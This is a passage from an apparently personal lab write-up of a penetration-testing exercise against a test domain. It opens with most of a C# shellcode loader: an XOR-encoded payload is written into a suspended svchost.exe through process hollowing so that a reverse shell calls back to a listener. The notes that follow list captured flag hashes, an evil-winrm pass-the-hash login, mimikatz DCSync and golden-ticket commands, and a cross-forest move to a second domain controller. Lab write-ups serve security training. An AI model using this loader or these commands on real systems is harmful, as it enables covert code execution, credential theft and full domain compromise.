style="color:#ff0044;font-weight:400">0x1b</span>,<span style="color:#ff0044;font-weight:400">0x4e</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0x0e</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x26</span>,<br /><span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<span style="color:#ff0044;font-weight:400">0x0c</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x3c</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<span style="color:#ff0044;font-weight:400">0x6d</span>,<span style="color:#ff0044;font-weight:400">0x49</span>,<span style="color:#ff0044;font-weight:400">0x69</span>,<br /><span style="color:#ff0044;font-weight:400">0x56</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0x31</span>,<span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xdc</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0x08</span>,<span style="color:#ff0044;font-weight:400">0x2b</span>,<span style="color:#ff0044;font-weight:400">0x07</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<br /><span style="color:#ff0044;font-weight:400">0xb3</span>,<span style="color:#ff0044;font-weight:400">0x2f</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0xa8</span>,<span style="color:#ff0044;font-weight:400">0x8f</span>,<span style="color:#ff0044;font-weight:400">0x5a</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x67</span>,<span style="color:#ff0044;font-weight:400">0xa5</span>,<br /><span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0x4f</span>,<span style="color:#ff0044;font-weight:400">0xa0</span>,<span style="color:#ff0044;font-weight:400">0x2e</span>,<span style="color:#ff0044;font-weight:400">0xe3</span>,<span style="color:#ff0044;font-weight:400">0x90</span>,<span style="color:#ff0044;font-weight:400">0x13</span>,<span style="color:#ff0044;font-weight:400">0xd2</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<span style="color:#ff0044;font-weight:400">0x81</span>,<span style="color:#ff0044;font-weight:400">0x3e</span>,<br /><span style="color:#ff0044;font-weight:400">0x0c</span>,<span style="color:#ff0044;font-weight:400">0x66</span>,<span style="color:#ff0044;font-weight:400">0x3f</span>,<span style="color:#ff0044;font-weight:400">0xdd</span>,<span style="color:#ff0044;font-weight:400">0x86</span>,<span style="color:#ff0044;font-weight:400">0x7b</span>,<span style="color:#ff0044;font-weight:400">0x4c</span>,<span style="color:#ff0044;font-weight:400">0x6c</span>,<span style="color:#ff0044;font-weight:400">0x27</span>,<span style="color:#ff0044;font-weight:400">0xef</span>,<span style="color:#ff0044;font-weight:400">0xbc</span>,<span style="color:#ff0044;font-weight:400">0x99</span>,<br /><span style="color:#ff0044;font-weight:400">0xb3</span>};<br /><br /><br />            <span style="color:#0088ff;font-weight:400">// Start &#39;svchost.exe&#39; in a suspended state</span><br />            StartupInfo sInfo = <span style="color:#ff9d00;font-weight:700">new</span> StartupInfo();<br />            ProcessInfo pInfo = <span style="color:#ff9d00;font-weight:700">new</span> ProcessInfo();<br />            <span style="color:#7f0044;font-weight:400">bool</span> cResult = CreateProcess(<span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#3ad900;font-weight:400">&quot;c:\\windows\\system32\\svchost.exe&quot;</span>, IntPtr.Zero, IntPtr.Zero,<br />                <span style="color:#ff0044;font-weight:400">false</span>, CREATE_SUSPENDED, IntPtr.Zero, <span style="color:#ff0044;font-weight:700">null</span>, <span style="color:#ff9d00;font-weight:700">ref</span> sInfo, <span style="color:#ff9d00;font-weight:700">out</span> pInfo);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Started &#39;svchost.exe&#39; in a suspended state with PID {pInfo.ProcessId}. Success: {cResult}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Get Process Environment Block (PEB) memory address of suspended process (offset 0x10 from base image)</span><br />            ProcessBasicInfo pbInfo = <span style="color:#ff9d00;font-weight:700">new</span> ProcessBasicInfo();<br />            <span style="color:#7f0044;font-weight:400">uint</span> retLen = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">uint</span>();<br />            <span style="color:#7f0044;font-weight:400">long</span> qResult = ZwQueryInformationProcess(pInfo.hProcess, PROCESSBASICINFORMATION, <span style="color:#ff9d00;font-weight:700">ref</span> pbInfo, (<span style="color:#7f0044;font-weight:400">uint</span>)(IntPtr.Size * <span style="color:#ff0044;font-weight:400">6</span>), <span style="color:#ff9d00;font-weight:700">ref</span> retLen);<br />            IntPtr baseImageAddr = (IntPtr)((Int64)pbInfo.PebAddress + <span style="color:#ff0044;font-weight:400">0x10</span>);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Got process information and located PEB address of process at {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + baseImageAddr.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}. Success: {qResult == 0}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Get entry point of the actual process executable</span><br />            <span style="color:#0088ff;font-weight:400">// This one is a bit complicated, because this address differs for each process (due to Address Space Layout Randomization (ASLR))</span><br />            <span style="color:#0088ff;font-weight:400">// From the PEB (address we got in last call), we have to do the following:</span><br />            <span style="color:#0088ff;font-weight:400">// 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing</span><br />            <span style="color:#0088ff;font-weight:400">// 2. Read the field &#39;e_lfanew&#39;, 4 bytes at offset 0x3C from executable address to get the offset for the PE header</span><br />            <span style="color:#0088ff;font-weight:400">// 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset</span><br />            <span style="color:#0088ff;font-weight:400">// 4. Read the value at the RVA offset address to get the offset of the executable entrypoint from the executable address</span><br />            <span style="color:#0088ff;font-weight:400">// 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!</span><br /><br />            <span style="color:#0088ff;font-weight:400">// 1. Read executable address from first 8 bytes (Int64, offset 0) of PEB and read data chunk for further processing</span><br />            <span style="color:#7f0044;font-weight:400">byte</span>[] procAddr = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">0x8</span>];<br />            <span style="color:#7f0044;font-weight:400">byte</span>[] dataBuf = <span style="color:#ff9d00;font-weight:700">new</span> <span style="color:#7f0044;font-weight:400">byte</span>[<span style="color:#ff0044;font-weight:400">0x200</span>];<br />            IntPtr bytesRW = <span style="color:#ff9d00;font-weight:700">new</span> IntPtr();<br />            <span style="color:#7f0044;font-weight:400">bool</span> result = ReadProcessMemory(pInfo.hProcess, baseImageAddr, procAddr, procAddr.Length, <span style="color:#ff9d00;font-weight:700">out</span> bytesRW);<br />            IntPtr executableAddress = (IntPtr)BitConverter.ToInt64(procAddr, <span style="color:#ff0044;font-weight:400">0</span>);<br />            result = ReadProcessMemory(pInfo.hProcess, executableAddress, dataBuf, dataBuf.Length, <span style="color:#ff9d00;font-weight:700">out</span> bytesRW);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;DEBUG: Executable base address: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + executableAddress.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// 2. Read the field &#39;e_lfanew&#39;, 4 bytes (UInt32) at offset 0x3C from executable address to get the offset for the PE header</span><br />            <span style="color:#7f0044;font-weight:400">uint</span> e_lfanew = BitConverter.ToUInt32(dataBuf, <span style="color:#ff0044;font-weight:400">0x3c</span>);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;DEBUG: e_lfanew offset: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + e_lfanew.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// 3. Take the memory at this PE header add an offset of 0x28 to get the Entrypoint Relative Virtual Address (RVA) offset</span><br />            <span style="color:#7f0044;font-weight:400">uint</span> rvaOffset = e_lfanew + <span style="color:#ff0044;font-weight:400">0x28</span>;<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;DEBUG: RVA offset: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + rvaOffset.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// 4. Read the 4 bytes (UInt32) at the RVA offset to get the offset of the executable entrypoint from the executable address</span><br />            <span style="color:#7f0044;font-weight:400">uint</span> rva = BitConverter.ToUInt32(dataBuf, (<span style="color:#7f0044;font-weight:400">int</span>)rvaOffset);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;DEBUG: RVA value: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + rva.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// 5. Get the absolute address of the entrypoint by adding this value to the base executable address. Success!</span><br />            IntPtr entrypointAddr = (IntPtr)((Int64)executableAddress + rva);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Got executable entrypoint address: {&quot;</span>0x<span style="color:#3ad900;font-weight:400">&quot; + entrypointAddr.ToString(&quot;</span>x<span style="color:#3ad900;font-weight:400">&quot;)}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Carrying on, decode the XOR payload</span><br />            <span style="color:#ff9d00;font-weight:700">for</span> (<span style="color:#7f0044;font-weight:400">int</span> i = <span style="color:#ff0044;font-weight:400">0</span>; i &lt; buf.Length; i++)<br />            {<br />                buf[i] = (<span style="color:#7f0044;font-weight:400">byte</span>)((<span style="color:#7f0044;font-weight:400">uint</span>)buf[i] ^ (<span style="color:#7f0044;font-weight:400">byte</span>)<span style="color:#00117f;font-weight:400">&#39;f&#39;</span>);<br />            }<br />            Console.WriteLine(<span style="color:#3ad900;font-weight:400">&quot;XOR-decoded payload.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Overwrite the memory at the identified address to &#39;hijack&#39; the entrypoint of the executable</span><br />            result = WriteProcessMemory(pInfo.hProcess, entrypointAddr, buf, buf.Length, <span style="color:#ff9d00;font-weight:700">out</span> bytesRW);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Overwrote entrypoint with payload. Success: {result}.&quot;</span>);<br /><br />            <span style="color:#0088ff;font-weight:400">// Resume the thread to trigger our payload</span><br />            <span style="color:#7f0044;font-weight:400">uint</span> rResult = ResumeThread(pInfo.hThread);<br />            Console.WriteLine($<span style="color:#3ad900;font-weight:400">&quot;Triggered payload. Success: {rResult == 1}. Check your listener!&quot;</span>);<br />        }<br />    }<br />}</pre></div><ul><li>local.txt sql03 <strong>c82ec02ab40ae61b99ad6d7ae390f8cf</strong> (187)</li><li>proof.txt: <strong>34f1d849081769958fe0875074650e7b</strong> (187)</li></ul></p><p></p><p></p><p></p><p><h2>Post Exploit sql03</h2></p><p><ul><li>Get-SqlServerLinkCrawl -Verbose -Instance sql03.final.com =<ul><li>no sql server links here </li></ul></li></ul></p><p></p><p></p><p><h2>SQL 11</h2><ul><li>same admin hash of sql03</li><li>evil-winrm -i sql11.final.com -u administrator -H 8388d07604009d14cbb78f7d37b9e887</li><li>Proof.txt : <strong>c49442636027884ef9494cc3da7d4bde</strong></li><li>mimikatz =&gt; tina password </li></ul></p><p></p><p></p><p><h2>DC01</h2></p><p></p><p>Proof.txt : <strong>e985e28867a61f75e813627ae1739f32</strong></p><p></p><p></p><p><h2>DC02 : forest attack</h2></p><p><ul><li>on dc01 dump via<ul><li>.\mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:final.com /all /csv&quot; &quot;exit&quot;</li></ul></li><li>get sids *<ul><li>Get-DomainSID -Domain final.com</li><li>.\mimikatz.exe &quot;kerberos::golden /user:Administrator /domain:final.com /sid:S-1-5-21-1725955968-4040474791-670206374 /krbtgt:405854caaf49b41e0e585369a001f114 /sids:S-1-5-21-1725955968-4040474791-670206374-519 /ptt&quot; &quot;exit&quot;</li></ul></li><li>more \\dc02.dev.final.com\c$\users\administrator\desktop\proof.txt</li><li>invoke-command -computername dc02.dev.final.com -scriptblock {whoami}</li><li>Flag <ul><li>a6d693bf3bc5008d40518022c69d3973</li></ul></li></ul></p></div>
</body>
</html>
